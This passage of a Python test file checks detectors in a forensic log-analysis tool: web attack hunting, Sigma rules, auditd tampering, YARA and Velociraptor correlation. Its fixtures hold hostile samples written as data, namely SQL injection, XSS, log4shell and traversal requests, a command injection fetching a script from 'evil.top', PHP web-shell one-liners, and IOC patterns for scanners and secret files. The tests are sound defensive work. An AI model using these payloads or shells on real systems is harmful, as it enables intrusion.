    -- and their keys come from whoever hits the server. A months-long log from a
    public site (one `_IpStat`, eight Counters, per distinct client) or a scanner
    rotating its UA per request grew them without limit, and the web drops are the
    biggest thing this engine parses. Past a ceiling new keys stop being tracked,
    known ones keep counting, and the cost is REPORTED rather than swallowed."""
    import logging
    from dataclasses import replace

    from artifact_engine.handlers import lin_web_metrics as wm

    monkeypatch.setattr(wm, "_MAX_IPS", 3)
    monkeypatch.setattr(wm, "_MAX_UAS", 2)
    lines = [f'10.0.0.{i} - - [25/May/2026:01:00:00 +0200] "GET /p{i} HTTP/1.1" '
             f'200 10 "-" "ua-{i}"' for i in range(9)]
    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text("\n".join(lines) + "\n", encoding="utf-8")

    out = tmp_path / "CSVs"
    # the shared _ctx passes log=None; production hands the engine logger, and the
    # whole point of this fix is that it SAYS what it dropped
    ctx = replace(_ctx(tmp_path, out), log=logging.getLogger("aeng-cap-test"))
    with caplog.at_level(logging.WARNING, logger="aeng-cap-test"):
        wm.run(ctx)

    rows = (out / "web_ip_stats.csv").read_text(encoding="utf-8").splitlines()
    assert len(rows) - 1 == 3                       # header + exactly the ceiling
    # the 6 requests that could not be attributed are named, not silently dropped
    msgs = " ".join(r.getMessage() for r in caplog.records)
    assert "beyond that ceiling" in msgs and "6 request(s)" in msgs


def test_handler_web_metrics_aggregates(tmp_path):
    brute = [f'8.8.8.8 - - [25/May/2026:01:00:{i:02d} +0200] "POST /wp-login.php '
             f'HTTP/1.1" 401 0 "-" "python-requests/2.28"' for i in range(25)]
    scan = [f'9.9.9.9 - - [25/May/2026:02:{i // 60:02d}:{i % 60:02d} +0200] '
            f'"GET /w{i} HTTP/1.1" 404 0 "-" "gobuster/3.1"' for i in range(60)]
    extra = [
        # sensitive 404 (kept in the ranking even at count 1)
        '9.9.9.9 - - [25/May/2026:02:10:00 +0200] "GET /.env HTTP/1.1" 404 0 "-" "curl/8"',
        # same sensitive path probed by 3 distinct IPs -> distinct_ips=3
        '1.1.1.1 - - [25/May/2026:05:00:00 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "-"',
        '2.2.2.2 - - [25/May/2026:05:00:01 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "-"',
        '3.3.3.3 - - [25/May/2026:05:00:02 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "-"',
        # WebDAV method -> odd-method flag
        '7.7.7.7 - - [25/May/2026:03:00:00 +0200] "PROPFIND /webdav HTTP/1.1" 405 0 "-" "-"',
        # sqli payload on a 404: probe still ranks the IP (huntweb would drop it)
        '91.92.10.10 - - [25/May/2026:04:00:00 +0200] "GET /s?q=1 UNION SELECT a,b '
        'FROM users HTTP/1.1" 404 1 "-" "-"',
    ]
    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text(
        "\n".join([_BENIGN, *brute, *scan, *extra]) + "\n", encoding="utf-8")

    p = ParserManifest(id="web_metrics",
                       handler="artifact_engine.handlers.lin_web_metrics:run")
    assert run_parser(p, _ctx(tmp_path, tmp_path / "CSVs")).status == "ok"

    stats = (tmp_path / "CSVs" / "web_ip_stats.csv").read_text(encoding="utf-8")
    lines = stats.splitlines()
    assert lines[0] == ("ip,country,origin,asn,requests,s2xx,s3xx,s401,s403,s404,"
                        "s4xx,s5xx,mb_sent,paths,odd_methods,attack_hits,"
                        "first_seen,last_seen,suspicious")
    assert lines[1].startswith("9.9.9.9,")                    # top talker first
    row = {ln.split(",")[0]: ln for ln in lines[1:]}
    assert row["9.9.9.9"].endswith(",scan") and ",61," in row["9.9.9.9"]
    assert row["8.8.8.8"].endswith(",auth-fail") and ",25,0," in row["8.8.8.8"]
    assert row["7.7.7.7"].endswith(",odd-method") and "PROPFIND:1" in row["7.7.7.7"]
    assert row["91.92.10.10"].endswith(",attack")             # probe counted (404)
    assert row["10.0.0.150"].endswith(",")                    # benign: no flag

    p404 = (tmp_path / "CSVs" / "web_404_paths.csv").read_text(encoding="utf-8")
    assert "/.env,1,1,sensitive" in p404                      # sensitive kept at 1 hit
    assert "/phpmyadmin/,3,3,sensitive" in p404               # 3 distinct IPs
    assert "/w1," not in p404                                 # 1-hit noise dropped

    auth = (tmp_path / "CSVs" / "web_auth_fail.csv").read_text(encoding="utf-8")
    assert "8.8.8.8,/wp-login.php,25,0,25," in auth
    assert auth.splitlines()[1].endswith("cluster+sensitive")

    # interactive report lands at the machine root (parent of CSVs/), embeds
    # the data and never references the network (offline evidence rule)
    html = (tmp_path / "web_metrics.html").read_text(encoding="utf-8")
    assert "const D=" in html and '"9.9.9.9"' in html
    assert '"attack"' in html.split("const D=")[1][:200000]   # flags embedded
    assert 'src="http' not in html and 'href="http' not in html
    assert "UNION SELECT" in html                             # payload sample captured
    # day RANGE + playback (a single day could not show scan -> exploit -> webshell)
    assert 'id="da"' in html and 'id="db"' in html and 'id="dplay"' in html
    assert "st.d0" in html and "st.d1" in html and "function setDays" in html
    assert "st.day" not in html                               # the single-day state is gone
    # URLs / UAs / queries are attacker-controlled: escape `>` too, like the graph does
    assert ".replace(/>/g,'&gt;')" in html


def test_indicators_load_and_match(tmp_path):
    from artifact_engine.handlers import _indicators
    f = tmp_path / "ioc.txt"
    f.write_text(
        "# comment\n"
        "\n"
        "sqlmap\n"                              # bare substring -> label = 'sqlmap'
        "secret = /\\.env\\b|/\\.git/\n"        # labelled regex
        "bad = (unbalanced\n",                  # invalid regex -> skipped with a warning
        encoding="utf-8",
    )
    rules = _indicators.load_indicators(f)
    labels = [lbl for lbl, _ in rules]
    assert labels == ["sqlmap", "secret"]       # blank/comment/bad-regex dropped
    assert _indicators.match_labels(rules, "get /x sqlmap/1.5") == ["sqlmap"]
    assert _indicators.match_labels(rules, "/.env") == ["secret"]
    assert _indicators.match_labels(rules, "nothing here") == []
    assert _indicators.combined(rules).search("foo /.git/ bar") is not None
    assert _indicators.load_indicators(tmp_path / "missing.txt") == []


def test_handler_huntweb_user_indicators_any_status(tmp_path):
    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text("\n".join([
        _BENIGN,
        # scanner UA on a 404 (NOT served) -> built-in would skip, user IOC catches it
        '9.9.9.9 - - [25/May/2026:01:00:00 +0200] "GET /login HTTP/1.1" 404 0 "-" "sqlmap/1.7"',
        # secret path on a 403 -> user IOC
        '8.8.8.8 - - [25/May/2026:01:00:01 +0200] "GET /.env HTTP/1.1" 403 0 "-" "curl/8"',
    ]) + "\n", encoding="utf-8")
    assets = tmp_path / "assets"
    assets.mkdir()
    (assets / "web_suspicious.txt").write_text(
        "scanner_ua = \\bsqlmap\\b\nsecret_path = /\\.env\\b\n", encoding="utf-8")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                        assets=assets, machine_name="host", volume="live", log=None)
    p = ParserManifest(id="huntweb", handler="artifact_engine.handlers.lin_huntweb:run")
    assert run_parser(p, ctx).status == "ok"
    out = (tmp_path / "CSVs" / "huntweb.csv").read_text(encoding="utf-8")
    assert "scanner_ua," in out and "sqlmap/1.7" in out and ",404," in out   # any status
    assert "secret_path," in out and "/.env" in out
    assert "/~dbw00/" not in out                                             # benign untouched


def test_handler_huntweb_flags_payloads_skips_benign_and_geo(tmp_path):
    attacks = [
        # cmdi (ThinkPHP) from a Tor-listed public IP
        '45.66.33.21 - - [25/May/2026:00:23:03 +0200] "GET /index.php?s=/index/'
        r'think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec'
        '&vars[1][]=wget http://evil.top/s.sh HTTP/1.1" 200 1 "-" "-"',
        # lfi from a private IP
        '10.0.0.5 - - [25/May/2026:00:00:00 +0200] "GET /a?f=../../../../etc/passwd '
        'HTTP/1.1" 200 1 "-" "-"',
        # sqli, xss (encoded), log4shell from an unknown public IP
        '91.92.10.10 - - [25/May/2026:00:00:01 +0200] "GET /s?q=1 UNION SELECT a,b '
        'FROM users HTTP/1.1" 200 1 "-" "-"',
        '91.92.10.10 - - [25/May/2026:00:00:02 +0200] "GET /p?x=%3Cscript%3Ealert(1)'
        '%3C/script%3E HTTP/1.1" 200 1 "-" "-"',
        '91.92.10.10 - - [25/May/2026:00:00:03 +0200] "GET /j?x=${jndi:ldap://evil/a} '
        'HTTP/1.1" 200 1 "-" "-"',
        # cmdi payload but the server returned 404 -> must be filtered out (not served)
        '5.5.5.5 - - [25/May/2026:00:00:09 +0200] "GET /zzz404?x=;wget http://evil/s.sh '
        'HTTP/1.1" 404 1 "-" "-"',
    ]
    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text(
        "\n".join([_BENIGN, _JETPACK, _FILEMGR, *attacks]) + "\n", encoding="utf-8")
    assets = tmp_path / "assets"
    assets.mkdir()
    (assets / "tor-exit-nodes.txt").write_text("45.66.33.21\n", encoding="utf-8")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                        assets=assets, machine_name="host", volume="live", log=None)
    p = ParserManifest(id="huntweb", handler="artifact_engine.handlers.lin_huntweb:run")
    r = run_parser(p, ctx)
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "huntweb.csv").read_text(encoding="utf-8")

    assert out.splitlines()[0].startswith("category,flag,time,ip,country,origin,asn")
    # benign traffic never flagged (FP guards)
    assert "/~dbw00/" not in out
    assert "xmlrpc.php" not in out                   # jetpack is legitimate
    assert "/t.php" not in out                       # php file-manager (abs path, no ../)
    assert "zzz404" not in out                       # payload but 404 -> not served, filtered
    # every attack class detected, category is the first column
    assert "cmdi," in out and "invokefunction" in out
    assert "lfi," in out and "/etc/passwd" in out
    assert "sqli," in out
    assert "xss," in out
    assert "log4shell," in out
    # offline IP origin enrichment (no mmdb -> country '?'/asn '', but tags resolve)
    assert ",45.66.33.21,?,tor," in out              # Tor exit list hit
    assert ",10.0.0.5,LAN,private," in out           # RFC1918
    assert ",91.92.10.10,?,unknown," in out         # public, no geo db


def test_sigma_web_engine_compiles_bundled_rules():
    from artifact_engine.core import sigma_engine
    sigma_engine.load_web_rules.cache_clear()
    rules = sigma_engine.load_web_rules()
    assert len(rules) >= 10                                  # bundled SigmaHQ webserver rules
    assert all(r.table == "web" for r in rules)
    assert all(r.sql.startswith("SELECT * FROM web ") for r in rules)
    assert all("<TABLE_NAME>" not in r.sql for r in rules)   # placeholder substituted
    titles = {r.title for r in rules}
    assert "SQL Injection Strings In URI" in titles
    # proxy-log rules (category:proxy) are excluded -> no exact-UA FP engines
    assert not any("Framework User Agent" in t or "APT User Agent" in t for t in titles)


def test_webcommon_parse_unwraps_quoted_line():
    from artifact_engine.handlers._webcommon import parse
    # whole CLF line wrapped in quotes (acunetix/netsparker/w3af export style)
    rec = parse('"192.168.4.25 - - [22/Dec/2016:16:30:52 +0300] '
                '"POST /a/index.php HTTP/1.1" 303 382 "-" "scanner""')
    assert rec is not None
    assert rec.ip == "192.168.4.25"                          # no stray leading quote
    assert rec.method == "POST" and rec.path == "/a/index.php"
    assert rec.ua == "scanner"                               # no stray trailing quote


def test_handler_web_sigma_detects_attacks_aggregates_and_geo(tmp_path):
    from artifact_engine.core import sigma_engine
    sigma_engine.load_web_rules.cache_clear()

    attacks = [
        # SQLi (served 200) from a public IP -- two distinct payloads, same IP
        '91.92.10.10 - - [25/May/2026:00:00:01 +0200] "GET /s?q=1 UNION SELECT a,b '
        'FROM users HTTP/1.1" 200 1 "-" "Mozilla/5.0"',
        '91.92.10.10 - - [25/May/2026:00:00:05 +0200] "GET /s?id=1 order by 5 '
        'HTTP/1.1" 200 1 "-" "Mozilla/5.0"',
        # path traversal (in query) from a private IP
        '10.0.0.5 - - [25/May/2026:00:00:02 +0200] "GET /a?f=../../../etc/passwd '
        'HTTP/1.1" 200 1 "-" "Mozilla/5.0"',
        # source-code enumeration keyword (.git/) -- any status
        '10.0.0.5 - - [25/May/2026:00:00:03 +0200] "GET /.git/config HTTP/1.1" 200 1 "-" "curl"',
    ]
    ap = tmp_path / "[root]" / "var" / "log" / "apache2"
    ap.mkdir(parents=True)
    (ap / "access.log").write_text(
        "\n".join([_BENIGN, *attacks]) + "\n", encoding="utf-8")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                        assets=tmp_path, machine_name="host", volume="live", log=None)
    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
    assert run_parser(p, ctx).status == "ok"
    out = (tmp_path / "CSVs" / "web_sigma.csv").read_text(encoding="utf-8")
    header = out.splitlines()[0]
    assert header.startswith("level,rule,mitre,hits,first_seen,last_seen,ip,country,origin,asn")
    # every webserver attack class detected
    assert "SQL Injection Strings In URI" in out
    assert "Path Traversal Exploitation Attempts" in out
    assert "Source Code Enumeration Detection by Keyword" in out
    # aggregation: the two SQLi payloads from one IP collapse to a single row/hits=2
    import csv as _csv
    import io as _io
    recs = list(_csv.DictReader(_io.StringIO(out)))
    sqli = [r for r in recs if r["rule"] == "SQL Injection Strings In URI"]
    assert len(sqli) == 1 and sqli[0]["hits"] == "2"
    # offline IP origin enrichment present (no mmdb -> country '?'/'LAN')
    assert ",91.92.10.10,?,unknown," in out
    assert ",10.0.0.5,LAN,private," in out
    # benign traffic never flagged
    assert "/~dbw00/" not in out


def test_handler_web_sigma_no_logs_is_clean(tmp_path):
    (tmp_path / "[root]").mkdir()
    p = ParserManifest(id="web_sigma", handler="artifact_engine.handlers.lin_web_sigma:run")
    assert run_parser(p, _ctx(tmp_path, tmp_path / "CSVs")).status == "skipped"
    assert not (tmp_path / "CSVs" / "web_sigma.csv").exists()


def test_is_hosting_classifier():
    from artifact_engine.handlers._webcommon import is_hosting
    assert is_hosting("Aeza Group LLC")              # bulletproof
    assert is_hosting("DigitalOcean, LLC")           # major cloud
    assert is_hosting("Hetzner Online GmbH")
    assert is_hosting("Some Datacenter Services")    # generic infra term
    assert is_hosting("Acme VPN Provider")
    assert not is_hosting("Telefonica de Espana")    # residential ISP
    assert not is_hosting("Vodafone Ono")
    assert not is_hosting("")


def test_handler_auditd_config_skips_when_absent(tmp_path):
    (tmp_path / "[root]" / "etc").mkdir(parents=True)
    p = ParserManifest(id="auditd_config",
                       handler="artifact_engine.handlers.lin_auditd_config:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"


def test_handler_auditd_config_default_posture_not_flagged(tmp_path):
    ad = tmp_path / "[root]" / "etc" / "audit"
    ad.mkdir(parents=True)
    # SUSE stock "audit nothing" default -> surfaced, NOT flagged.
    (ad / "audit.rules").write_text(
        "## auto-generated\n-D\n\n-a task,never\n", encoding="utf-8")
    (ad / "auditd.conf").write_text(
        "write_logs = yes\nlog_file = /var/log/audit/audit.log\n"
        "max_log_file_action = ROTATE\n", encoding="utf-8")

    p = ParserManifest(id="auditd_config",
                       handler="artifact_engine.handlers.lin_auditd_config:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "auditd_config.csv").read_text(encoding="utf-8")
    assert "no syscall auditing" in out
    assert "task,never=yes" in out
    assert ",yes" not in out                         # nothing flagged on a default box


def test_handler_auditd_config_flags_tampering(tmp_path):
    ad = tmp_path / "[root]" / "etc" / "audit"
    ad.mkdir(parents=True)
    # Loaded ruleset: auditing turned off (-e 0); lost the execve watch it used to have.
    (ad / "audit.rules").write_text(
        "-D\n-e 0\n-w /etc/passwd -p wa -k identity\n", encoding="utf-8")
    (ad / "audit.rules.prev").write_text(
        "-D\n-w /etc/passwd -p wa -k identity\n"
        "-a always,exit -F arch=b64 -S execve -k exec\n"
        "-w /var/log/audit -p wa -k auditlog\n", encoding="utf-8")
    # Daemon configured to NOT write logs and to a non-default path.
    (ad / "auditd.conf").write_text(
        "write_logs = no\nlog_file = /tmp/aud.log\n"
        "max_log_file_action = ignore\n", encoding="utf-8")

    p = ParserManifest(id="auditd_config",
                       handler="artifact_engine.handlers.lin_auditd_config:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "auditd_config.csv").read_text(encoding="utf-8")
    assert "coverage" in out and "enabled=-e0" in out
    out_lines = out.splitlines()
    # -e 0 in the loaded ruleset -> coverage flagged
    assert any(ln.startswith("coverage") and ln.endswith(",yes") for ln in out_lines)
    # write_logs=no / ignore / non-default path -> daemon flagged
    assert any(ln.startswith("daemon") and ln.endswith(",yes") for ln in out_lines)
    assert "write_logs=no" in out
    # rules dropped since the previous ruleset -> flagged; added watch -> not
    assert 'rule_removed,"-a always,exit -F arch=b64 -S execve -k exec",yes' in out  # comma -> CSV-quoted
    assert "rule_removed,-w /var/log/audit -p wa -k auditlog,yes" in out
    assert "rule_added,-w /etc/passwd -p wa -k identity,no" not in out  # unchanged, not added


# --------------------------------------------------------------------------- #
# Windows YARA
# --------------------------------------------------------------------------- #
def test_handler_win_yara_matches_and_skips_output(tmp_path):
    import shutil

    import pytest
    pytest.importorskip("yara")
    from artifact_engine.config import DATA_DIR

    rules_dir = tmp_path / "assets" / "yara"
    rules_dir.mkdir(parents=True)
    for yar in (DATA_DIR / "assets" / "yara").glob("*.yar"):
        shutil.copy(yar, rules_dir / yar.name)

    dl = tmp_path / "Users" / "bob" / "Downloads"
    dl.mkdir(parents=True)
    (dl / "evil.php").write_text("<?php @system($_GET['c']); ?>", encoding="utf-8")
    (dl / "ok.php").write_text("<?php echo json_encode($d); ?>", encoding="utf-8")
    # cache subtree under a scan root -> pruned
    cache = dl / "Cache"
    cache.mkdir()
    (cache / "x.php").write_text("<?php @eval($_POST['c']); ?>", encoding="utf-8")
    # the tool's own output sits at the evidence root -> never a scan root
    csvs = tmp_path / "CSVs"
    csvs.mkdir()
    (csvs / "leftover.php").write_text("<?php @system($_GET['c']); ?>", encoding="utf-8")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "out", tools=tmp_path,
                        assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
    p = ParserManifest(id="yara", handler="artifact_engine.handlers.win_yara:run")
    r = run_parser(p, ctx)
    assert r.status == "ok"
    out = (tmp_path / "out" / "yara.csv").read_text(encoding="utf-8")
    assert "Users/bob/Downloads/evil.php" in out
    assert "ok.php" not in out              # benign spared
    assert "Cache" not in out               # cache subtree pruned
    assert "leftover" not in out            # output dir never scanned


def test_handler_win_yara_skips_without_targets(tmp_path):
    import pytest
    pytest.importorskip("yara")
    from artifact_engine.config import DATA_DIR
    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_yara
    assets = tmp_path / "assets" / "yara"
    assets.mkdir(parents=True)
    import shutil
    for yar in (DATA_DIR / "assets" / "yara").glob("*.yar"):
        shutil.copy(yar, assets / yar.name)
    (tmp_path / "Windows" / "System32").mkdir(parents=True)   # no staging dirs
    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "out", tools=tmp_path,
                        assets=tmp_path / "assets", machine_name="h", volume="C", log=None)
    raised = False
    try:
        win_yara.run(ctx)
    except HandlerSkip:
        raised = True
    assert raised
    assert not (tmp_path / "out" / "yara.csv").exists()


# --------------------------------------------------------------------------- #
# Velociraptor LiveResponse
# --------------------------------------------------------------------------- #
def _write_lr(results: Path, artifact: str, records: list[dict]) -> None:
    """Write a Velociraptor JSONL artifact with the Eiffel.* prefix (so the
    prefix-stripping is exercised) under a results dir."""
    import json
    f = results / f"Eiffel.LiveResponse.Windows%2F{artifact}.json"
    f.write_text("\n".join(json.dumps(r) for r in records), encoding="utf-8")
    (f.parent / (f.name + ".index")).write_bytes(b"\x00")   # sidecar to be ignored


def test_liveresponse_names_every_service_sharing_a_pid(tmp_path):
    """svchost.exe hosts MANY services under one PID. Keeping only the last one made
    the correlation panel name an arbitrary service as the launcher -- wrong data in
    the very place meant to explain where a process came from."""
    from artifact_engine.handlers import win_liveresponse_velociraptor as lr

    svchost = "C:\\Windows\\System32\\svchost.exe"
    out_by_key = {
        "Windows.System.Pslist": [
            {"Pid": 4, "Ppid": 0, "Name": "services.exe",
             "Exe": "C:\\Windows\\System32\\services.exe"},
            {"Pid": 900, "Ppid": 4, "Name": "svchost.exe", "Exe": svchost,
             "flag": "masquerade"},          # flagged so it becomes an entity
        ],
        "Windows.System.Services": [
            {"Pid": 900, "Name": "Schedule", "State": "RUNNING", "AbsoluteExePath": svchost},
            {"Pid": 900, "Name": "BITS", "State": "RUNNING", "AbsoluteExePath": svchost},
            {"Pid": 900, "Name": "Dnscache", "State": "RUNNING", "AbsoluteExePath": svchost},
        ],
    }
    entities, _flags, _detail = lr._correlate(out_by_key)
    ent = next(e for e in entities if e["pid"] == 900)
    name = ent["launched_by"]["name"]
    assert {"Schedule", "BITS", "Dnscache"} <= set(name.split(", "))
    assert ent["launched_by"]["kind"] == "service"


def test_handler_liveresponse_correlation(tmp_path):
    import json

    from artifact_engine.handlers import win_liveresponse_velociraptor as lr
    results = tmp_path / "Velociraptor" / "LiveResponse" / "results"
    results.mkdir(parents=True)
    (tmp_path / "C").mkdir()

    _write_lr(results, "Generic.Client.Info", [{"Hostname": "WS9", "Fqdn": "ws9.lab"}])
    # explorer -> winword -> powershell (macro chain); powershell is staged + beacons.
    _write_lr(results, "Windows.System.Pslist", [
        {"Pid": 500, "Ppid": 8, "Name": "explorer.exe", "Exe": "C:\\Windows\\explorer.exe"},
        {"Pid": 900, "Ppid": 500, "Name": "winword.exe",
         "Exe": "C:\\Program Files\\Microsoft Office\\winword.exe"},
        {"Pid": 1000, "Ppid": 900, "Name": "powershell.exe",
         "Exe": "C:\\Users\\v\\AppData\\Local\\Temp\\ps.exe",
         "CommandLine": "powershell -enc ZQBjAGgAbwA=", "Username": "LAB\\v",
         "TokenIsElevated": True, "CreateTime": "2026-06-14T10:00:00Z"},
        {"Pid": 1500, "Ppid": 1000, "Name": "cmd.exe", "Exe": "C:\\Windows\\System32\\cmd.exe"},
    ])
    _write_lr(results, "Windows.Network.Netstat", [
        {"Pid": 1000, "Name": "powershell.exe", "Status": "ESTAB",
         "Raddr.IP": "1.2.3.4", "Raddr.Port": 443},
        {"Pid": 1000, "Name": "powershell.exe", "Status": "ESTAB",
         "Raddr.IP": "10.0.0.9", "Raddr.Port": 445},          # internal, not a beacon
    ])
    _write_lr(results, "Windows.Network.ListeningPorts", [
        {"Pid": 1000, "Name": "powershell.exe", "Port": 4444, "Address": "0.0.0.0"}])
    _write_lr(results, "Windows.System.Services", [
        {"Name": "EvilSvc", "State": "Running", "Pid": 1000,
         "AbsoluteExePath": "C:\\Users\\v\\AppData\\Local\\Temp\\ps.exe"}])

    ctx = ParserContext(evidence=tmp_path / "C", out=tmp_path / "JSONs", tools=tmp_path,
                        assets=tmp_path, machine_name="WS9", volume="C", log=None)
    lr.run(ctx)

    corr = json.loads((tmp_path / "JSONs" / "correlation.json").read_text(encoding="utf-8"))
    ent = {e["pid"]: e for e in corr["entities"]}
    ps = ent[1000]
    assert set(ps["flags"]) >= {"exec_from_staging", "lolbin",
                                "suspicious_ancestry", "staged_beacon", "staged_listener"}
    assert ps["severity"] == "high"
    assert ps["ancestry"] == ["explorer.exe(500)", "winword.exe(900)", "powershell.exe(1000)"]
    assert "cmd.exe(1500)" in ps["children"]
    # a staged process's connections are all carried (owner_in_staging); the
    # staged_beacon reason points at the PUBLIC peer, not the internal one
    raddrs = {c["raddr"] for c in ps["connections"]}
    assert {"1.2.3.4", "10.0.0.9"} <= raddrs
    assert any(c["port"] == 4444 for c in ps["listening"])
    assert ps["launched_by"] == {"kind": "service", "name": "EvilSvc", "state": "Running"}

    # the correlation flags are folded back into process.json and suspicious.json,
    # with a detail that spells out the whole cross-artifact story
    procs = {p["Pid"]: p for p in
             json.loads((tmp_path / "JSONs" / "processes.json").read_text(encoding="utf-8"))}
    assert "staged_beacon" in procs[1000]["flag"]
    susp = json.loads((tmp_path / "JSONs" / "suspicious.json").read_text(encoding="utf-8"))
    anc = [f for f in susp["findings"] if "suspicious_ancestry" in f["flag"]]
    assert anc and "spawned by winword.exe(900)" in anc[0]["detail"]
    assert "beacons to 1.2.3.4:443" in anc[0]["detail"]


def test_handler_liveresponse_suspicious_and_normalises(tmp_path):
    import json

    from artifact_engine.handlers import win_liveresponse_velociraptor as lr
    results = tmp_path / "Velociraptor" / "LiveResponse" / "results"
    results.mkdir(parents=True)
    evidence = tmp_path / "C"
    evidence.mkdir()

    _write_lr(results, "Generic.Client.Info", [{"Hostname": "WS01", "Fqdn": "ws01.lab"}])
    _write_lr(results, "Windows.System.TaskScheduler", [
        {"TaskName": "\\Evil", "Command": "x",
         "_XML": {"Task": {"Actions": {"Exec": {"Command": "C:\\Users\\b\\AppData\\Local\\Temp\\p.exe"}}}}},
        {"TaskName": "\\Adobe", "Command": "c:\\program files\\adobe\\arm.exe",
         "_XML": {"Task": {"Actions": {"Exec": {"Command": "C:\\Program Files\\Adobe\\arm.exe"}}}}},
    ])
    _write_lr(results, "Windows.System.Services", [
        {"Name": "evilsvc", "PathName": "x", "AbsoluteExePath": "C:\\Windows\\Temp\\s.exe"},
        {"Name": "good", "AbsoluteExePath": "C:\\Windows\\System32\\svchost.exe"},
    ])
    _write_lr(results, "Windows.System.Pslist", [
        {"Pid": 1000, "Name": "p.exe", "Exe": "C:\\Users\\b\\Downloads\\p.exe", "CommandLine": "p.exe"},
        # svchost from a temp dir -> masquerade (and exec_from_staging)
        {"Pid": 1100, "Name": "svchost.exe", "Exe": "C:\\Windows\\Temp\\svchost.exe", "CommandLine": ""},
        {"Pid": 4, "Name": "System", "Exe": ""},
    ])
    _write_lr(results, "Windows.Network.ListeningPorts", [
        {"Pid": 1000, "Name": "p.exe", "Port": 4444, "Address": "0.0.0.0"},   # backdoor port + staged
        {"Pid": 999, "Name": "svc.exe", "Port": 443, "Address": "0.0.0.0"},   # benign
    ])
    _write_lr(results, "Windows.Network.Netstat", [
        {"Pid": 1000, "Name": "p.exe", "Status": "ESTAB", "Raddr.IP": "8.8.8.8", "Raddr.Port": 443},
        {"Pid": 4, "Name": "System", "Status": "ESTAB", "Raddr.IP": "10.0.0.5", "Raddr.Port": 445},
    ])
    _write_lr(results, "Windows.System.Drivers", [
        {"Name": "evil", "DriverName": "C:\\Windows\\Temp\\evil.sys", "IsSigned": False},
        {"Name": "rtcore", "DriverName": "RTCore64.sys", "IsSigned": True},   # known BYOVD
        {"Name": "ok", "DriverName": "C:\\Windows\\System32\\drivers\\ok.sys", "IsSigned": True},
    ])
    _write_lr(results, "Windows.Network.ArpCache", [
        {"AddressFamily": "IPv4", "RemoteAddress": "192.168.1.1", "RemoteMACAddress": "aa-bb-cc-dd-ee-ff"},
        {"AddressFamily": "IPv4", "RemoteAddress": "192.168.1.9", "RemoteMACAddress": "aa-bb-cc-dd-ee-ff"},
    ])
    _write_lr(results, "Windows.System.LoggedInUsers", [
        {"LogonName": "rdpguy", "LogonType": 10}, {"LogonName": "local", "LogonType": 2}])
    _write_lr(results, "Windows.System.Shares", [
        {"Name": "secret$", "Path": "C:\\stage"}, {"Name": "C$", "Path": "C:\\"}])
    _write_lr(results, "Windows.System.LocalAdmins", [
        {"Name": "h\\bob", "SID": "S-1-5-21-1-2-3-1003", "PrincipalSource": "Local"},
        {"Name": "Administrator", "SID": "S-1-5-21-1-2-3-500", "PrincipalSource": "Local"}])
    _write_lr(results, "Windows.Sys.AllUsers", [
        {"Name": "x", "Directory": "C:\\Windows\\Temp\\profile"}])
    _write_lr(results, "Windows.System.DNSCache", [
        {"Name": "www.myexternalip.com.", "Record": "1.2.3.4"},
        {"Name": "windowsupdate.microsoft.com", "Record": "2.2.2.2"}])
    _write_lr(results, "Windows.Persistence.PermanentWMIEvents", [
        {"Namespace": "root/subscription",
         "ConsumerDetails": {"Name": "EvilASEC", "ScriptText": "GetObject('script:http://x')"}},
        {"Namespace": "root/subscription",
         "ConsumerDetails": {"Name": "SCM Event Log Consumer"}},   # benign default
    ])
    _write_lr(results, "Windows.Sys.StartupItems", [
        {"Name": "Run", "OSPath": "HK..\\Run", "Details": "C:\\Users\\Public\\bo.exe"},
    ])
    _write_lr(results, "Windows.System.HostsFile", [
        {"Hostname": "evil.example", "Resolution": "1.2.3.4"},
        {"Hostname": "", "Resolution": None},                       # empty -> ignored
    ])

    ctx = ParserContext(evidence=evidence, out=tmp_path / "JSONs", tools=tmp_path,
                        assets=tmp_path, machine_name="WS01", volume="C", log=None)
    lr.run(ctx)

    # Every activity table gets a per-row `flag` column; client_info (identity) does not.
    procs = json.loads((tmp_path / "JSONs" / "processes.json").read_text(encoding="utf-8"))
    assert isinstance(procs, list) and "flag" in procs[0]
    assert "flag" not in json.loads((tmp_path / "JSONs" / "client_info.json").read_text(encoding="utf-8"))[0]
    # netstat carries the scope/owner_exe enrichment columns
    net = json.loads((tmp_path / "JSONs" / "netstat.json").read_text(encoding="utf-8"))
    assert net[0]["scope"] == "public" and "owner_exe" in net[0]

    susp = json.loads((tmp_path / "JSONs" / "suspicious.json").read_text(encoding="utf-8"))
    flags: set[str] = set()
    for f in susp["findings"]:
        flags.update(f["flag"].split("+"))
    assert {"exec_from_staging", "masquerade", "owner_in_staging", "suspicious_port",
            "vulnerable_driver", "unsigned_driver", "duplicate_mac", "code_consumer",
            "hosts_entry", "rdp_session", "non_default_share", "local_account_admin",
            "nonstandard_profile_path", "recon_or_dyndns"} <= flags
    # benign defaults / rows must NOT appear
    assert all("SCM Event Log Consumer" not in f["detail"] for f in susp["findings"])
    assert all("windowsupdate" not in f["detail"] for f in susp["findings"])
    assert susp["counts"]["high"] >= 6
